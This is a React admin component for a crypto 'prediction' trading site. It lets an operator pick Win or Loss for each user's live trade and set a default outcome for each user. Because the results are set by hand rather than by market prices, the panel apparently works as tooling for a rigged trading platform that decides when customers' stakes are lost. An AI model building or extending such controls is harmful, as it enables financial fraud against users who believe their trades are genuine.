import React, { useEffect, useState } from "react";
import axios from "axios";

const AdminTradeControl = () => {
  const [predictions, setPredictions] = useState([]);
  const [users, setUsers] = useState([]);
  const [confirmAction, setConfirmAction] = useState(null); // State to handle confirmation
  const [selectedPrediction, setSelectedPrediction] = useState(null); // State to handle selected prediction
  const [selectedUser, setSelectedUser] = useState(null); // State to handle selected user

  useEffect(() => {
    const fetchData = async () => {
      try {
        const waitingResponse = await axios.get(
          "https://trcnfx.com/api/predictions/waiting"
        );
        const allResponse = await axios.get(
          "https://trcnfx.com/api/predictions"
        );
        const usersResponse = await axios.get(
          "https://trcnfx.com/api/users/default-trade-results"
        );

        const waitingPredictions = waitingResponse.data.map((prediction) => ({
          ...prediction,
          isLive: true,
        }));

        setPredictions(
          [...waitingPredictions, ...allResponse.data].sort(
            (a, b) => new Date(b.predictedAt) - new Date(a.predictedAt)
          )
        );
        setUsers(usersResponse.data);
      } catch (error) {
        console.error("Error fetching data:", error);
      }
    };

    fetchData();
  }, []);

  const handleResult = async (id, result) => {
    try {
      await axios.post(
        `https://trcnfx.com/api/prediction/${id}/result`,
        result
      );
      setPredictions((prevPredictions) =>
        prevPredictions.filter((prediction) => prediction._id !== id)
      );
    } catch (error) {
      console.error("Error updating prediction result:", error);
    }
  };

  const handleDefaultResult = async (userId, result) => {
    try {
      await axios.post(
        `https://trcnfx.com/api/users/${userId}/default-trade-result`,
        result
      );
      setUsers((prevUsers) =>
        prevUsers.map((user) =>
          user._id === userId
            ? { ...user, defaultTradeResult: result.defaultTradeResult }
            : user
        )
      );
    } catch (error) {
      console.error("Error updating default trade result:", error);
    }
  };

  const handleConfirmAction = (action, prediction, user) => {
    setConfirmAction(action);
    setSelectedPrediction(prediction);
    setSelectedUser(user);
  };

  const handleCancelAction = () => {
    setConfirmAction(null);
    setSelectedPrediction(null);
    setSelectedUser(null);
  };

  const handleConfirmResult = () => {
    if (selectedPrediction && confirmAction) {
      handleResult(selectedPrediction._id, confirmAction);
    } else if (selectedUser && confirmAction) {
      handleDefaultResult(selectedUser._id, confirmAction);
    }
    setConfirmAction(null);
    setSelectedPrediction(null);
    setSelectedUser(null);
  };

  return (
    <div className="admin-trade-control p-4">
      <h2 className="text-2xl font-bold mb-4">Admin Trade Control</h2>
      <div className="overflow-x-auto">
        <table className="min-w-full bg-white rounded-lg shadow">
          <thead>
            <tr className="w-full bg-gray-200 text-gray-600 uppercase text-sm leading-normal">
              <th className="py-3 px-6 text-left">User ID</th>
              <th className="py-3 px-6 text-left">Coin</th>
              <th className="py-3 px-6 text-left">Date and Time</th>
              <th className="py-3 px-6 text-left">Trade Direction</th>
              <th className="py-3 px-6 text-left">Trade Amount</th>
              <th className="py-3 px-6 text-left">Delivery Time</th>
              <th className="py-3 px-6 text-left">Fee</th>
              <th className="py-3 px-6 text-left">Actions</th>
            </tr>
          </thead>
          <tbody className="text-gray-600 text-sm font-light">
            {predictions.map((prediction) => (
              <tr
                key={prediction._id}
                className="border-b border-gray-200 hover:bg-gray-100"
              >
                <td className="py-3 px-6 text-left whitespace-nowrap">
                  {prediction.uid}
                </td>
                <td className="py-3 px-6 text-left whitespace-nowrap">
                  {prediction.symbol.toUpperCase()}/USDT
                </td>
                <td className="py-3 px-6 text-left">
                  {new Date(prediction.predictedAt).toLocaleString()}
                </td>
                <td className="py-3 px-6 text-left">{prediction.direction}</td>
                <td className="py-3 px-6 text-left">{prediction.amount}</td>
                <td className="py-3 px-6 text-left">
                  {prediction.deliveryTime}
                </td>
                <td className="py-3 px-6 text-left">{prediction.fee}</td>
                <td className="py-3 px-6 text-left">
                  {prediction.isLive ? (
                    <>
                      <button
                        className="bg-green-500 text-white py-1 px-3 rounded mr-2"
                        onClick={() =>
                          handleConfirmAction(
                            {
                              success: true,
                              amount: prediction.amount,
                              message: "Admin approved profit",
                            },
                            prediction,
                            null
                          )
                        }
                      >
                        Win
                      </button>
                      <button
                        className="bg-red-500 text-white py-1 px-3 rounded mr-2"
                        onClick={() =>
                          handleConfirmAction(
                            {
                              success: false,
                              amount: prediction.amount,
                              message: "Admin approved loss",
                            },
                            prediction,
                            null
                          )
                        }
                      >
                        Loss
                      </button>
                      <button
                        className="bg-gray-500 text-white py-1 px-3 rounded"
                        onClick={() =>
                          handleConfirmAction(
                            { success: null },
                            prediction,
                            null
                          )
                        }
                      >
                        Default
                      </button>
                    </>
                  ) : (
                    <span className="text-green-500">&#x25cf;</span>
                  )}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <div className="overflow-x-auto mt-4">
        <h3 className="text-xl font-bold mb-4">Default Trade Control</h3>
        <table className="min-w-full bg-white rounded-lg shadow">
          <thead>
            <tr className="w-full bg-gray-200 text-gray-600 uppercase text-sm leading-normal">
              <th className="py-3 px-6 text-left">User ID</th>
              <th className="py-3 px-6 text-left">Email</th>
              <th className="py-3 px-6 text-left">Default Trade Result</th>
              <th className="py-3 px-6 text-left">Actions</th>
            </tr>
          </thead>
          <tbody className="text-gray-600 text-sm font-light">
            {users.map((user) => (
              <tr
                key={user._id}
                className="border-b border-gray-200 hover:bg-gray-100"
              >
                <td className="py-3 px-6 text-left whitespace-nowrap">
                  {user.userId}
                </td>
                <td className="py-3 px-6 text-left whitespace-nowrap">
                  {user.email}
                </td>
                <td className="py-3 px-6 text-left">
                  {user.defaultTradeResult || "None"}
                </td>
                <td className="py-3 px-6 text-left">
                  <>
                    <button
                      className="bg-green-500 text-white py-1 px-3 rounded mr-2"
                      onClick={() =>
                        handleConfirmAction(
                          {
                            defaultTradeResult: "win",
                            message: "Admin set default trade result to win",
                          },
                          null,
                          user
                        )
                      }
                    >
                      Win
                    </button>
                    <button
                      className="bg-red-500 text-white py-1 px-3 rounded mr-2"
                      onClick={() =>
                        handleConfirmAction(
                          {
                            defaultTradeResult: "loss",
                            message: "Admin set default trade result to loss",
                          },
                          null,
                          user
                        )
                      }
                    >
                      Loss
                    </button>
                    <button
                      className="bg-gray-500 text-white py-1 px-3 rounded"
                      onClick={() =>
                        handleConfirmAction(
                          { defaultTradeResult: null },
                          null,
                          user
                        )
                      }
                    >
                      Default
                    </button>
                  </>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {confirmAction && (selectedPrediction || selectedUser) && (
        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50">
          <div className="bg-white p-6 rounded shadow-lg">
            <h3 className="text-xl font-bold mb-4">Confirm Action</h3>
            <p className="mb-4">
              Are you sure you want to{" "}
              {confirmAction.defaultTradeResult === "win"
                ? "set win"
                : confirmAction.defaultTradeResult === "loss"
                ? "set loss"
                : confirmAction.success === true
                ? "win"
                : confirmAction.success === false
                ? "lose"
                : "keep the default"}{" "}
              {selectedUser
                ? `for user ${selectedUser.userId}`
                : `this trade ${
                    selectedPrediction ? selectedPrediction._id : ""
                  }`}
              ?
            </p>
            <div className="flex justify-end">
              <button
                className="bg-green-500 text-white py-1 px-3 rounded mr-2"
                onClick={handleConfirmResult}
              >
                Confirm
              </button>
              <button
                className="bg-red-500 text-white py-1 px-3 rounded"
                onClick={handleCancelAction}
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default AdminTradeControl;
